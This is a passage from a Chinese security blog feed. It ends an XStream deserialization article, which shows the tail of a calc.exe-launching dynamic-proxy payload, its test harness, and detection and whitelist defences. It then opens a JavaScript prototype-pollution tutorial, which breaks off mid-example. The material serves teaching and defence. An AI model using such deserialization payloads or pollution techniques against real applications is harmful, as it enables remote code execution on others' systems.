class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改Test.java，将Person类改为IPerson接口类，和ipayload.xml中的interface标签内容相对应：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("ipayload.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        IPerson p = (IPerson) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一点需要注意的是，IPerson接口类必须定义成public即公有的，否则程序运行会报错显示没有权限访问该接口类。</p><p>成功触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/1.png" alt=""></p><h5 id="无法通杀-lt-1-3-1版本的原因-2"><a href="#无法通杀-lt-1-3-1版本的原因-2" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>尝试攻击会报以下错误，说是不能创建EventHandler类对象、因为其没有无参构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Cannot construct java.beans.EventHandler as it does not have a no-args constructor : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException</span><br><span class="line">cause-message       : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">path                : /dynamic-proxy/handler</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><h5 id="无法通杀1-4-7-1-4-9版本的原因-2"><a href="#无法通杀1-4-7-1-4-9版本的原因-2" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ol><li>查看目标环境中是否有存在漏洞版本的XStream的jar包，即1.4.x系列版本中&lt;=1.4.6或=1.4.10；</li><li>全局搜索是否存在<code>Xstream.fromXML(</code>的地方，若存在则进一步分析该参数是否外部可控；若为1.4.10版本的还需要确认是否开启了安全配置进行了有效的防御；</li></ol><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>将XStream升级到最新版，即1.4.11之后的版本；</p></li><li><p>若只想手动修改代码，可以参考1.4.7-1.4.9版本的修补方法，在ReflectionConverter.canConvert()函数中添加了对包括EventHandler等类的过滤，当然这只是黑名单过滤方式，存在绕过风险：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type) || (<span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; type != eventHandlerType))</span><br><span class="line">    &amp;&amp; canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，可以调用addPermission()、allowTypes()、denyTypes()等对某些类进行限制，即建立黑白名单机制进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission（TypePermission）;</span><br><span class="line">XStream.allowTypes（Class []）;</span><br><span class="line">XStream.allowTypes（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.allowTypesByWildcard（String []）;</span><br><span class="line">XStream.allowTypeHierary（Class）;</span><br><span class="line">XStream.denyPermission（TypePermission）;</span><br><span class="line">XStream.denyTypes（Class []）;</span><br><span class="line">XStream.denyTypes（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.denyTypesByWildcard（String []）;</span><br><span class="line">XStream.denyTypeHierary（Class）;</span><br></pre></td></tr></table></figure><p>具体的参考：<a href="http://x-stream.github.io/security.html" target="_blank" rel="noopener">http://x-stream.github.io/security.html</a></p></li><li><p>若是1.4.10版本，提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认白名单，其本质还是调用XStream提供的安全框架里的addPermission()、allowTypes()、denyTypes()等函数，区别在于自己定义了一些默认白名单，<strong>但必须手工设置，否则还是存在漏洞</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupDefaultSecurity</span><span class="params">(<span class="keyword">final</span> XStream xstream)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xstream.insecureWarning) &#123;</span><br><span class="line">        xstream.addPermission(NoTypePermission.NONE);</span><br><span class="line">        xstream.addPermission(NullPermission.NULL);</span><br><span class="line">        xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);</span><br><span class="line">        xstream.addPermission(ArrayTypePermission.ARRAYS);</span><br><span class="line">        xstream.addPermission(InterfaceTypePermission.INTERFACES);</span><br><span class="line">        xstream.allowTypeHierarchy(Calendar.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Collection.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.Entry.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Member.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Number.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Throwable.class);</span><br><span class="line">        xstream.allowTypeHierarchy(TimeZone.class);</span><br><span class="line"></span><br><span class="line">        Class type = JVM.loadClassForName(<span class="string">"java.lang.Enum"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line">        type = JVM.loadClassForName(<span class="string">"java.nio.file.Path"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Set types = <span class="keyword">new</span> HashSet();</span><br><span class="line">        types.add(BitSet.class);</span><br><span class="line">        types.add(Charset.class);</span><br><span class="line">        types.add(Class.class);</span><br><span class="line">        types.add(Currency.class);</span><br><span class="line">        types.add(Date.class);</span><br><span class="line">        types.add(DecimalFormatSymbols.class);</span><br><span class="line">        types.add(File.class);</span><br><span class="line">        types.add(Locale.class);</span><br><span class="line">        types.add(Object.class);</span><br><span class="line">        types.add(Pattern.class);</span><br><span class="line">        types.add(StackTraceElement.class);</span><br><span class="line">        types.add(String.class);</span><br><span class="line">        types.add(StringBuffer.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.lang.StringBuilder"</span>));</span><br><span class="line">        types.add(URL.class);</span><br><span class="line">        types.add(URI.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.util.UUID"</span>));</span><br><span class="line">        <span class="keyword">if</span> (JVM.isSQLAvailable()) &#123;</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Timestamp"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Time"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Date"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (JVM.is18()) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.Clock"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Duration"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Instant"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.MonthDay"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Period"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Ser"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Year"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.YearMonth"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.ZonedDateTime"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.ZoneId"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.HijrahDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseEra"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.MinguoDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.ThaiBuddhistDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.Ser"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.chrono.Chronology"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.ValueRange"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.WeekFields"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        types.remove(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Iterator iter = types.iterator();</span><br><span class="line">        <span class="keyword">final</span> Class[] classes = <span class="keyword">new</span> Class[types.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classes.length; ++i) &#123;</span><br><span class="line">            classes[i] = (Class)iter.next();</span><br><span class="line">        &#125;</span><br><span class="line">        xstream.allowTypes(classes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Security framework of XStream instance already initialized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试下效果，在前面的Demo我们添加这个默认白名单过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        <span class="comment">// 使用默认白名单过滤</span></span><br><span class="line">        XStream.setupDefaultSecurity(xstream);</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后会报错，显示禁止反序列化动态代理类，成功修补了漏洞：</p><p><img src="/2019/10/21/XStream反序列化漏洞/30.png" alt=""></p></li></ol><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://x-stream.github.io/" target="_blank" rel="noopener">XStream官网</a></p><p><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/" target="_blank" rel="noopener">RCE via XStream object deserialization</a></p><p><a href="https://www.freebuf.com/column/209781.html" target="_blank" rel="noopener">XStream CVE-2019-10173漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析JavaScript原型链污染攻击</title>
    <link href="https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/"/>
    <id>https://www.mi1k7ea.com/2019/10/20/浅析JavaScript原型链污染攻击/</id>
    <published>2019-10-20T04:41:21.000Z</published>
    <updated>2019-10-21T15:41:22.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="JavaScript构造函数与类"><a href="#JavaScript构造函数与类" class="headerlink" title="JavaScript构造函数与类"></a>JavaScript构造函数与类</h3><p>在JavaScript中，构造函数相当于类，且可以将其实例化。</p><p>如果要定义一个类，需要以定义构造函数的方式来定义：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/1.png" alt=""></p><p>这里Foo函数的内容，就是Foo类的构造函数，而this.num就是Foo类的一个属性。</p><h3 id="JavaScript语法特性"><a href="#JavaScript语法特性" class="headerlink" title="JavaScript语法特性"></a>JavaScript语法特性</h3><p>在介绍JS原型链之前，需要了解下JS中一些访问对象的语法特性。</p><p>如图：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/2.png" alt=""></p><h3 id="JavaScript原型对象prototype与-proto"><a href="#JavaScript原型对象prototype与-proto" class="headerlink" title="JavaScript原型对象prototype与__proto__"></a>JavaScript原型对象prototype与__proto__</h3><h4 id="原型对象prototype"><a href="#原型对象prototype" class="headerlink" title="原型对象prototype"></a>原型对象prototype</h4><p>原型对象prototype是新对象的模板，它将自身的属性共享给新对象。一个对象不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。</p><p><strong>所有的JavaScript对象都会从一个原型对象prototype中继承属性和方法。</strong></p><p><strong>JavaScript的每一个函数/类都有一个prototype属性，用来指向该构造函数的原型。</strong></p><p>下面定义了一个Hacker函数，看到其有prototype属性、指向了该构造函数的原型本身：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/4.png" alt=""></p><h4 id="proto-属性"><a href="#proto-属性" class="headerlink" title="__proto__属性"></a>__proto__属性</h4><p><strong>JavaScript的每一个实例对象都有一个__proto__属性指向该实例对象的原型。</strong></p><p>下面新建一个Hacker类的实例对象hacker，看到其有__proto__属性，访问该属性可知是指向hacker这个实例对象的原型的：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/5.png" alt=""></p><p>观察发现，<strong>实例对象由函数生成，实例对象的__proto__属性是指向函数的prototype属性的</strong>，即：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/6.png" alt=""></p><p>接着我们注意到，在前面调用的无论是实例对象的__proto__属性还是构造函数/类的prototype属性，它们均有一个__proto__属性指向Object，而再往下调用__proto__属性就是在调用Object.__proto__、其值为null：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/7.png" alt=""></p><p>这个就涉及到后面要讲的原型链的东西了：<strong>所有JavaScript中的对象都是位于原型链顶端的Object的实例，其中实例对象原型的原型是Object.prototype，而它的原型是null，所以Object.prototype就是原型链的最顶端。</strong></p><h4 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h4><p>我们知道，构造函数/类的prototype属性指向该函数的原型，相应的该构造函数的原型也有相应的属性指向该构造函数——constructor属性。</p><p>每个原型对象都有一个constructor属性，指向相关联的构造函数，所以构造函数和构造函数的prototype即原型是可以相互指向的。实例对象也可以访问constructor属性指向其构造函数。</p><h3 id="JavaScript原型链与原型链继承"><a href="#JavaScript原型链与原型链继承" class="headerlink" title="JavaScript原型链与原型链继承"></a>JavaScript原型链与原型链继承</h3><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>由于__proto__是任何JavaScript对象都有的属性，而JavaScript中万物皆对象，因此会形成一条__proto__连起来的链，递归访问__proto__直至到终点即值为null，这就是原型链。</p><p>我们看前面用到的Hacker构造函数和hacker实例对象的例子，其原型链即类实例对象的原型链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker -&gt; Hacker.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure><p>这里改下smi1e的图，可以看到Hacker构造函数和hacker实例对象的原型链结构：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/9.png" alt=""></p><p>除了类实例对象的原型链，再看看其他的原型链。</p><p>数组的原型链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c -&gt; Array.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/10.png" alt=""></p><p>日期的原型链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d -&gt; Date.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure><p>函数的原型链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f -&gt; function.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/11.png" alt=""></p><h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h4><p>根据原型链，所有类对象在实例化的时候会拥有prototype中的属性和方法，在原型链上的任何位置设置属性都能被子对象访问到，这个特性被用来实现JavaScript中的继承机制。</p><p>当JavaScript引擎查找对象的属性时，会先查找对象本身是否存在该属性，若不存在则会在原型对链上查看、直到找到一个名字匹配的属性或到达原型链的末尾即null。这种查找机制被运用在面向对象的继承中，被称为原型链继承。</p><p>比如下面定义了构造函数Person，并创建了一个实例对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> alan = <span class="keyword">new</span> Person(<span class="string">"Alan"</span>, <span class="string">"Iverson"</span>, <span class="number">18</span>, <span class="string">"blue"</span>);</span><br></pre></td></tr></table></figure><p>如果我们想在已定义存在的Person类中直接添加属性是不行的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure><p>要添加的话只能在该构造函数定义的时候添加上该属性：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">  <span class="keyword">this</span>.nationality = <span class="string">"English"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果都这样添加的话，实在是太麻烦了。这个时候就能用上原型链继承的方法来轻松实现给示例对象添加新属性的功能：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/8.png" alt=""></p><p>总结一下，对于实例对象alan，在调用alan.nationality的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在实例对象alan中寻找nationality；</li><li>如果找不到，则在alan.__proto__中寻找nationality；</li><li>如果仍然找不到，则继续在alan.__proto__.__proto__中寻找nationality；</li><li>依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null；</li></ol><h2 id="0x02-JavaScript原型链污染"><a href="#0x02-JavaScript原型链污染" class="headerlink" title="0x02 JavaScript原型链污染"></a>0x02 JavaScript原型链污染</h2><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>在JavaScript中访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p><p>原型链污染一般会出现在对象或数组的键名或属性名可控，而且是赋值语句的情况下。</p><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>那么什么场景会出现原型链污染呢？——一般是可以设置__proto__值的场景，即能够控制数组（对象）的键名的操作：</p><ul><li>对象merge，即合并数组对象的操作；</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>看个Demo：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hacker是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> hacker = &#123;<span class="attr">name</span>: <span class="string">"mi1k7ea"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hacker.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改hacker的原型（即Object）</span></span><br><span class="line">hacker.__proto__.name = <span class="string">"prototype attack!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，hacker.name仍然是mi1k7ea</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的user对象</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看user.name(user.name="prototype attack!")</span></span><br><span class="line"><span class="built_in">console</span>.log(user.name)</span><br></pre></td></tr></table></figure><p>可以看到，hacker实例对象本身就存在name属性，而通过hacker.__proto__.name设置的name属性实际就是设置hacker.__proto__指向的Object对象的name属性并进行了赋值，当再输出hacker实例对象的name属性时，由于JS引擎直接在当前hacker上找到该属性而无需继续往上到原型链上寻找name属性；但user实例对象是个空的对象、无任何属性，因此当尝试输出user对象的name属性值时JS引擎会在user对象的原型链上寻找name属性，其中在Object对象上找到了name属性就获取输出出来：</p><p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/12.png" alt=""></p><p>再看个P神文章中用到的merge()函数的例子，假设有如下的merge()函数定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> 